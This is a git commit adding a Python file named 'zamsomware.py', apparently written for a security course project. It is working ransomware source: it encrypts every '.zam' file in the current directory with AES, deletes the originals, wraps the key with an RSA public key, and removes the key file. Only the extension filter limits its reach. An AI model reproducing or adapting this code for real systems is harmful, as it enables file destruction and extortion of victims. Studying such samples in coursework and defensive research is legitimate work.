36a315629bad8bd5da51b538f10200c36e683e97
Zachary Morris <70924115+Zacham17@users.noreply.github.com>
2023-12-10 20:36:42 -0500

    Create zamsomware.py

---
+++ SEC440/project4/zamsomware.py
@@ -0,0 +1,56 @@
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+import os
+
+def generate_symmetric_key():
+    rand_key = os.urandom(32)  # 32 bytes for a 256-bit key
+    print(f'{rand_key}')
+    return rand_key
+
+def encrypt_file(file_path, symmetric_key):
+    with open(file_path, 'rb') as file:
+        plaintext = file.read()
+
+    cipher = Cipher(algorithms.AES(symmetric_key), modes.CFB(b'\0' * 16), backend=default_backend())
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+
+    with open(file_path + '.getRekt', 'wb') as encrypted_file:
+        encrypted_file.write(ciphertext)
+
+def encrypt_symmetric_key(symmetric_key, public_key_path):
+    with open(public_key_path, 'rb') as file:
+        public_key = serialization.load_pem_public_key(file.read(), backend=default_backend())
+
+    encrypted_key = public_key.encrypt(
+        symmetric_key,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+    with open('sym_key.enc', 'wb') as sym_key_file:
+        sym_key_file.write(encrypted_key)
+
+def main():
+    # Step 1: Generate a random symmetric key
+    symmetric_key = generate_symmetric_key()
+
+    # Step 2: Encrypt files with ".zam" extension
+    for filename in os.listdir('.'):
+        if filename.endswith('.zam'):
+            encrypt_file(filename, symmetric_key)
+            os.remove(filename)
+
+    # Step 3: Encrypt the symmetric key with the public key
+    encrypt_symmetric_key(symmetric_key, 'public_key.pem')
+
+    # Step 4: Delete the unencrypted symmetric key and public_key.pem
+    os.remove('public_key.pem')
+
+if __name__ == "__main__":
+    main()
